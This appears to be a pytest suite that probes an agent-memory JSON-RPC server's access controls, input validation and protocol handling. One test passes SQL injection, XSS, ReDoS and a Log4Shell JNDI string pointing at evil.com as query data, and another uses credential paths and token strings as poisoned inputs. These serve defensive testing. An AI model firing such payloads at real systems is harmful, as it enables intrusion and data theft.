from __future__ import annotations

import hashlib
import io
import json
import os
from pathlib import Path

import pytest
from agent_knowledge.ledger import Ledger
from agent_knowledge.mcp_jsonrpc import (
    ADMIN_AUTH_IDENTITY,
    dispatch_tool_call,
    handle_admin_jsonrpc_message,
    handle_jsonrpc_message,
    run_stdio_server,
)
from agent_knowledge.mcp_tools import (
    ADMIN_TOOL_NAMES,
    BRAIN_RESOLVE_TOOL_NAME,
    MEMORY_CANDIDATE_CREATE_TOOL_NAME,
    PUBLIC_AGENT_TOOL_NAMES,
    list_admin_tools,
    list_public_agent_tools,
    list_tools,
)
from agent_knowledge.knowledge_search_service import (
    DisabledRetiredIndexBridgeClient,
    KnowledgeSearchService,
)


def _create_test_service(tmp_path: Path) -> KnowledgeSearchService:
    private = tmp_path / "private"
    private.mkdir(parents=True, exist_ok=True)
    os.chmod(private, 0o700)
    ledger = Ledger(private / "challenger_ledger.sqlite")
    return KnowledgeSearchService(
        ledger=ledger,
        retired_index_bridge=DisabledRetiredIndexBridgeClient(),
        dataset_ids=[],
        allow_private_results=True,
    )


# =============================================================================
# Challenge 1: Exhaustive Public Surface Isolation (All 32 Admin Tools)
# =============================================================================

class TestPublicSurfaceIsolation:
    """Every non-public tool must fail-closed on public surface with -32601."""

    @pytest.mark.parametrize("admin_tool", sorted(ADMIN_TOOL_NAMES))
    def test_all_admin_tools_blocked_on_public_surface(self, tmp_path: Path, admin_tool: str):
        service = _create_test_service(tmp_path)
        # Attempt invocation with various plausible arguments
        msg = {
            "jsonrpc": "2.0",
            "id": f"probe-{admin_tool}",
            "method": "tools/call",
            "params": {
                "name": admin_tool,
                "arguments": {
                    "project": "test-project",
                    "repository": "pureliture/neurons",
                    "branch": "main",
                    "query": "adversarial probe",
                    "candidate_memory_id": "cand_1234567890abcdef",
                    "approved_by": "adversary",
                    "decision_id": "dec_escalation",
                    "reason": "adversarial probe",
                },
            },
        }
        # Explicit surface="agent"
        resp = handle_jsonrpc_message(msg, service, surface="agent")
        assert resp is not None
        assert "error" in resp, f"Admin tool {admin_tool} was NOT blocked on public surface!"
        assert resp["error"]["code"] == -32601, f"Expected -32601, got {resp['error']['code']}"
        assert f"unknown tool: {admin_tool}" in resp["error"]["message"]

        # Default surface (must default to agent / public)
        resp_default = handle_jsonrpc_message(msg, service)
        assert resp_default is not None
        assert "error" in resp_default
        assert resp_default["error"]["code"] == -32601

    def test_public_tools_list_strictly_contains_only_two_tools(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        resp = handle_jsonrpc_message(
            {"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
            service,
            surface="agent",
        )
        assert resp is not None
        assert "result" in resp
        tools = resp["result"]["tools"]
        tool_names = {t["name"] for t in tools}
        assert tool_names == PUBLIC_AGENT_TOOL_NAMES
        assert len(tools) == 2


# =============================================================================
# Challenge 2: Exhaustive Admin Surface Authentication & Authorization
# =============================================================================

class TestAdminSurfaceAuthentication:
    """Admin surface must strictly reject unauthenticated / unauthorized requests."""

    @pytest.mark.parametrize("bad_token", [None, "", "wrong_token", "admin", "Bearer lbrain_admin", "lbrain_admin\n", "LBRAIN_ADMIN"])
    def test_admin_tools_list_rejects_invalid_tokens(self, tmp_path: Path, bad_token: str | None):
        service = _create_test_service(tmp_path)
        resp = handle_jsonrpc_message(
            {"jsonrpc": "2.0", "id": 10, "method": "tools/list"},
            service,
            surface="admin",
            auth_token=bad_token,
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32000
        assert "unauthorized" in resp["error"]["message"]

    @pytest.mark.parametrize("admin_tool", sorted(ADMIN_TOOL_NAMES))
    @pytest.mark.parametrize("bad_token", [None, "forged_identity", "root"])
    def test_all_admin_tools_call_rejects_unauthenticated(self, tmp_path: Path, admin_tool: str, bad_token: str | None):
        service = _create_test_service(tmp_path)
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": f"auth-probe-{admin_tool}",
                "method": "tools/call",
                "params": {
                    "name": admin_tool,
                    "arguments": {"project": "test-project"},
                },
            },
            service,
            surface="admin",
            auth_token=bad_token,
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32000
        assert "unauthorized" in resp["error"]["message"]

    def test_admin_surface_authorized_lists_all_32_tools(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        resp = handle_jsonrpc_message(
            {"jsonrpc": "2.0", "id": 20, "method": "tools/list"},
            service,
            surface="admin",
            auth_token=ADMIN_AUTH_IDENTITY,
        )
        assert resp is not None
        assert "result" in resp
        tools = resp["result"]["tools"]
        tool_names = {t["name"] for t in tools}
        assert tool_names == ADMIN_TOOL_NAMES
        assert len(tools) == 32


# =============================================================================
# Challenge 3: Adversarial Parameter Tampering on memory_candidate_create
# =============================================================================

class TestMemoryCandidateCreateTampering:
    """Stress-test proposal invariants and parameter injection defense."""

    def test_privilege_escalation_lifecycle_tampering(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        valid_hash = "sha256:" + "0" * 64
        payload = {
            "card_type": "decision",
            "project": "proj-tamper",
            "title": "Privilege Escalation Attempt",
            "summary": "Trying to force accepted state",
            "typed_payload": {
                "decision": "escalate",
                "rationale": "exploit",
                "alternatives": [],
                "consequence": "none",
                "authority_ref": "self",
            },
            "content_hash": valid_hash,
            # Injected malicious overrides:
            "lifecycle_state": "accepted",
            "authorization_status": "active",
            "approval_state": "approved",
            "status": "accepted",
            "currentness": "current",
        }
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 101,
                "method": "tools/call",
                "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
            },
            service,
            surface="agent",
        )
        assert resp is not None
        assert "result" in resp, f"Expected success with sanitized candidate, got {resp.get('error')}"
        sc = resp["result"]["structuredContent"]
        assert sc["lifecycle_state"] == "candidate"
        assert sc["authorization_status"] == "disabled"
        assert sc["approval_state"] == "suggested"
        assert sc["proposal_write_performed"] is True
        assert sc["authoritative_memory_changed"] is False
        assert sc["accepted"] is False

        # Verify in ledger that the card is NOT in accepted authority pack
        authority_pack = service.brain_steward().authority_pack_read(project="proj-tamper")
        assert authority_pack["count"] == 0

    @pytest.mark.parametrize("bad_hash", [
        "not_a_hash",
        "md5:d41d8cd98f00b204e9800998ecf8427e",
        "",
        "   ",
        "SHA256:" + "a" * 64,  # uppercase prefix
    ])
    def test_non_sha256_prefix_hash_rejected(self, tmp_path: Path, bad_hash: str):
        service = _create_test_service(tmp_path)
        payload = {
            "card_type": "decision",
            "project": "proj-hash",
            "title": "Bad Hash Test",
            "summary": "Testing hash prefix",
            "typed_payload": {"decision": "test", "rationale": "r", "alternatives": [], "consequence": "c", "authority_ref": "a"},
            "content_hash": bad_hash,
        }
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 102,
                "method": "tools/call",
                "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
            },
            service,
            surface="agent",
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32602

    @pytest.mark.parametrize("malformed_hash", [
        "sha256:1234",  # truncated length
        "sha256:" + "g" * 64,  # non-hex chars
        "sha256:" + "A" * 64,  # uppercase hex
        "sha256:" + "a" * 63,  # 63 chars
        "sha256:" + "a" * 65,  # 65 chars
    ])
    def test_empirical_bug_malformed_sha256_hash_bypasses_validation(self, tmp_path: Path, malformed_hash: str):
        """EMPIRICAL VERIFICATION: validate_content_hash strictly enforces SHA256_HEX_PATTERN regex."""
        service = _create_test_service(tmp_path)
        from agent_knowledge.session_memory.memory_card import SHA256_HEX_PATTERN, validate_content_hash

        # Directly demonstrate that malformed_hash fails regex
        assert SHA256_HEX_PATTERN.fullmatch(malformed_hash) is None, f"{malformed_hash} should fail regex"

        # Verified behavior: validate_content_hash raises ValueError for malformed sha256: strings
        with pytest.raises(ValueError):
            validate_content_hash(malformed_hash)

    @pytest.mark.parametrize("poisoned_field,poisoned_value", [
        ("title", "/Users/ddalkak/secret/credentials.json"),
        ("summary", "Token is Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcSemACt8x4iTMCda8Yhe3iZaWbvV5XKSTbuAn0M"),
        ("title", "private transcript content leaking here"),
        ("summary", "raw_transcript_body dump"),
        ("summary", "API_KEY: abcdef1234567890"),
        ("summary", "~/sensitive/data.txt"),
    ])
    def test_poisoned_forbidden_content_rejected(self, tmp_path: Path, poisoned_field: str, poisoned_value: str):
        service = _create_test_service(tmp_path)
        valid_hash = "sha256:" + "f" * 64
        payload = {
            "card_type": "decision",
            "project": "proj-poison",
            "title": "Clean Title",
            "summary": "Clean Summary",
            "typed_payload": {"decision": "test", "rationale": "r", "alternatives": [], "consequence": "c", "authority_ref": "a"},
            "content_hash": valid_hash,
        }
        payload[poisoned_field] = poisoned_value
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 103,
                "method": "tools/call",
                "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
            },
            service,
            surface="agent",
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32602
        # Ensure nothing was written to review queue
        queue = service.brain_steward().review_queue_list(project="proj-poison")
        assert queue["count"] == 0

    @pytest.mark.parametrize("bad_confidence", [-0.1, 1.1, 999, "high"])
    def test_invalid_confidence_rejected(self, tmp_path: Path, bad_confidence):
        service = _create_test_service(tmp_path)
        payload = {
            "card_type": "decision",
            "project": "proj-conf",
            "title": "Conf Test",
            "summary": "Summary",
            "typed_payload": {"decision": "test", "rationale": "r", "alternatives": [], "consequence": "c", "authority_ref": "a"},
            "content_hash": "sha256:" + "1" * 64,
            "confidence": bad_confidence,
        }
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 104,
                "method": "tools/call",
                "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
            },
            service,
            surface="agent",
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32602

    def test_empirical_bug_boolean_confidence_silently_coerced(self, tmp_path: Path):
        """EMPIRICAL FINDING: memory_miner float() silently coerces True to 1.0."""
        service = _create_test_service(tmp_path)
        payload = {
            "card_type": "decision",
            "project": "proj-conf-bool",
            "title": "Conf Bool Test",
            "summary": "Summary",
            "typed_payload": {"decision": "test", "rationale": "r", "alternatives": [], "consequence": "c", "authority_ref": "a"},
            "content_hash": "sha256:" + "1" * 64,
            "confidence": True,
        }
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 105,
                "method": "tools/call",
                "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
            },
            service,
            surface="agent",
        )
        # Demonstrates that boolean True is accepted and coerced to 1.0 instead of rejected
        assert "result" in resp
        assert resp["result"]["structuredContent"]["proposal"]["confidence"] == 1.0

    def test_proposer_normalization_and_attribution(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        for proposer in ["codex", "claude-code", "gemini", "hermes", "unspecified"]:
            payload = {
                "card_type": "decision",
                "project": f"proj-{proposer}",
                "title": f"Decision by {proposer}",
                "summary": "Valid proposal",
                "typed_payload": {"decision": "d", "rationale": "r", "alternatives": [], "consequence": "c", "authority_ref": "a"},
                "content_hash": "sha256:" + hashlib.sha256(proposer.encode("utf-8")).hexdigest(),
                "proposer": proposer,
            }
            resp = handle_jsonrpc_message(
                {
                    "jsonrpc": "2.0",
                    "id": f"prop-{proposer}",
                    "method": "tools/call",
                    "params": {"name": MEMORY_CANDIDATE_CREATE_TOOL_NAME, "arguments": payload},
                },
                service,
                surface="agent",
            )
            assert resp is not None
            assert "result" in resp
            item = resp["result"]["structuredContent"]["proposal"]
            assert item["proposed_by"] == proposer


# =============================================================================
# Challenge 4: Adversarial Stress-Testing of brain.resolve
# =============================================================================

class TestBrainResolveEdgeCases:
    """Stress-test brain.resolve multi-mode dispatch and boundaries."""

    def test_brain_resolve_empty_project_and_repo_fails(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 201,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "", "repository": "", "mode": "context"},
                },
            },
            service,
            surface="agent",
        )
        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32602

    def test_brain_resolve_query_mode_empty_or_whitespace_query_fails(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        for bad_q in ["", "   ", "\t\n"]:
            resp = handle_jsonrpc_message(
                {
                    "jsonrpc": "2.0",
                    "id": 202,
                    "method": "tools/call",
                    "params": {
                        "name": BRAIN_RESOLVE_TOOL_NAME,
                        "arguments": {"project": "proj-test", "mode": "query", "query": bad_q},
                    },
                },
                service,
                surface="agent",
            )
            assert resp is not None
            assert "error" in resp
            assert resp["error"]["code"] == -32602

    def test_brain_resolve_sql_and_regex_injection_query_strings(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        injection_queries = [
            "' OR '1'='1",
            "'; DROP TABLE memory_cards; --",
            "\\x00",
            ".*",
            "(a+)+$",
            "[a-z]{1,1000000}",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.com/x}",
        ]
        for idx, q in enumerate(injection_queries, start=210):
            resp = handle_jsonrpc_message(
                {
                    "jsonrpc": "2.0",
                    "id": idx,
                    "method": "tools/call",
                    "params": {
                        "name": BRAIN_RESOLVE_TOOL_NAME,
                        "arguments": {"project": "proj-injection", "mode": "query", "query": q},
                    },
                },
                service,
                surface="agent",
            )
            assert resp is not None
            assert "error" not in resp, f"Query {q!r} triggered unhandled error: {resp.get('error')}"
            assert resp["result"]["structuredContent"]["schema_version"] == "lbrain_slim_context.v1"
            assert resp["result"]["structuredContent"]["query"] == q

    def test_brain_resolve_temporal_as_of_variants(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        # Create an accepted card first via steward with explicit date bounds
        ledger = service.ledger
        with ledger._transaction() as tx:
            tx.upsert_llm_brain_memory_card({
                "memory_id": "mem_temporal_001",
                "brain_id": "brain_test",
                "card_type": "decision",
                "scope": "project",
                "project": "proj-temporal",
                "provider": "codex",
                "title": "Temporal Architecture Decision",
                "summary": "Valid during 2026",
                "render_text": "Valid during 2026",
                "lifecycle_state": "accepted",
                "judgment_state": "none",
                "status": "accepted",
                "approval_state": "approved",
                "governance_tier": "medium",
                "freshness": "current",
                "currentness": "current",
                "confidence": 1.0,
                "confidence_basis": "verified",
                "source_refs": [],
                "evidence_refs": [],
                "evidence_hashes": [],
                "derived_from": [],
                "supersedes": [],
                "superseded_by": [],
                "conflicts": [],
                "active_until": "",
                "valid_from": "2026-01-01T00:00:00+00:00",
                "valid_to": "2026-12-31T23:59:59+00:00",
                "typed_payload": {
                    "decision": "Use PostgreSQL pgvector",
                    "rationale": "Unified storage",
                    "alternatives": [],
                    "consequence": "none",
                    "authority_ref": "RFC-2026",
                },
            })

        # 1. Query within valid window (2026-06-01) -> card is returned
        resp1 = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 220,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-temporal", "mode": "context", "as_of": "2026-06-01T12:00:00Z"},
                },
            },
            service,
            surface="agent",
        )
        assert len(resp1["result"]["structuredContent"]["decisions"]) == 1

        # 2. Query before valid window (2025-01-01) -> card is excluded
        resp2 = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 221,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-temporal", "mode": "context", "as_of": "2025-01-01T00:00:00Z"},
                },
            },
            service,
            surface="agent",
        )
        assert len(resp2["result"]["structuredContent"]["decisions"]) == 0

        # 3. Query after valid window (2027-01-01) -> card is excluded
        resp3 = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 222,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-temporal", "mode": "context", "as_of": "2027-01-01T00:00:00Z"},
                },
            },
            service,
            surface="agent",
        )
        assert len(resp3["result"]["structuredContent"]["decisions"]) == 0

        # 4. Malformed as_of format -> graceful fallback (does not crash)
        resp4 = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 223,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-temporal", "mode": "context", "as_of": "invalid-date-string"},
                },
            },
            service,
            surface="agent",
        )
        assert "error" not in resp4

    def test_brain_resolve_response_mode_slim_vs_with_evidence(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        with service.ledger._transaction() as tx:
            tx.upsert_llm_brain_memory_card({
                "memory_id": "mem_ev_001",
                "brain_id": "brain_test",
                "card_type": "decision",
                "scope": "project",
                "project": "proj-ev",
                "provider": "codex",
                "title": "Evidence Chain Decision",
                "summary": "Has full SHA256 chain",
                "render_text": "Has full SHA256 chain",
                "lifecycle_state": "accepted",
                "judgment_state": "none",
                "status": "accepted",
                "approval_state": "approved",
                "governance_tier": "medium",
                "freshness": "current",
                "currentness": "current",
                "confidence": 1.0,
                "confidence_basis": "verified",
                "source_refs": [{"source_id": "src_1", "content_hash": "sha256:" + "3" * 64}],
                "evidence_refs": [],
                "evidence_hashes": ["sha256:" + "4" * 64, "sha256:" + "5" * 64],
                "derived_from": [],
                "supersedes": [],
                "superseded_by": [],
                "conflicts": [],
                "active_until": "",
                "typed_payload": {
                    "decision": "Hash verified",
                    "rationale": "r",
                    "alternatives": [],
                    "consequence": "c",
                    "authority_ref": "RFC",
                },
            })

        # 1. Default response_mode="slim"
        slim_resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 230,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-ev", "response_mode": "slim"},
                },
            },
            service,
            surface="agent",
        )
        slim_data = slim_resp["result"]["structuredContent"]
        assert slim_data["schema_version"] == "lbrain_slim_context.v1"
        assert "evidence_hashes" not in slim_data
        assert "source_refs" not in slim_data
        # Wire payload size check
        wire_size = len(json.dumps(slim_data, ensure_ascii=False))
        assert wire_size <= 2048, f"Slim payload exceeded 2 KB: {wire_size} bytes"

        # 2. Opt-in response_mode="with_evidence"
        ev_resp = handle_jsonrpc_message(
            {
                "jsonrpc": "2.0",
                "id": 231,
                "method": "tools/call",
                "params": {
                    "name": BRAIN_RESOLVE_TOOL_NAME,
                    "arguments": {"project": "proj-ev", "response_mode": "with_evidence"},
                },
            },
            service,
            surface="agent",
        )
        ev_data = ev_resp["result"]["structuredContent"]
        assert ev_data["schema_version"] == "lbrain_evidence_context.v1"
        assert "evidence_hashes" in ev_data
        assert "sha256:" + "4" * 64 in ev_data["evidence_hashes"]
        assert "sha256:" + "5" * 64 in ev_data["evidence_hashes"]


# =============================================================================
# Challenge 5: Protocol Robustness & Stdio Server Simulation
# =============================================================================

class TestProtocolAndStdioRobustness:
    """Stress-test JSON-RPC error handling and stdio server streaming."""

    def test_malformed_json_rpc_envelopes(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        # Missing method
        r1 = handle_jsonrpc_message({"jsonrpc": "2.0", "id": 301}, service)
        assert r1["error"]["code"] == -32601

        # Unknown method
        r2 = handle_jsonrpc_message({"jsonrpc": "2.0", "id": 302, "method": "system/shutdown"}, service)
        assert r2["error"]["code"] == -32601

        # notifications/initialized returns None
        r3 = handle_jsonrpc_message({"jsonrpc": "2.0", "method": "notifications/initialized"}, service)
        assert r3 is None

        # initialize returns capabilities
        r4 = handle_jsonrpc_message({"jsonrpc": "2.0", "id": 304, "method": "initialize"}, service)
        assert "serverInfo" in r4["result"]

    def test_stdio_server_streaming_with_adversarial_lines(self, tmp_path: Path):
        service = _create_test_service(tmp_path)
        lines = [
            "",  # empty line
            "   \n",  # whitespace line
            "not valid json at all\n",  # parse error
            json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize"}) + "\n",
            json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}) + "\n",
            json.dumps({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "memory_candidate_approve", "arguments": {}}}) + "\n",
        ]
        stdin = io.StringIO("".join(lines))
        stdout = io.StringIO()

        run_stdio_server(service, stdin=stdin, stdout=stdout)

        output_lines = [json.loads(l) for l in stdout.getvalue().strip().split("\n") if l.strip()]
        assert len(output_lines) == 4

        # 1. Parse error
        assert output_lines[0]["error"]["code"] == -32700
        # 2. Initialize success
        assert output_lines[1]["id"] == 1
        assert "serverInfo" in output_lines[1]["result"]
        # 3. tools/list returns exactly 2 tools (default agent surface)
        assert output_lines[2]["id"] == 2
        assert len(output_lines[2]["result"]["tools"]) == 2
        # 4. tools/call for restricted tool returns -32601 on public stdio surface
        assert output_lines[3]["id"] == 3
        assert output_lines[3]["error"]["code"] == -32601
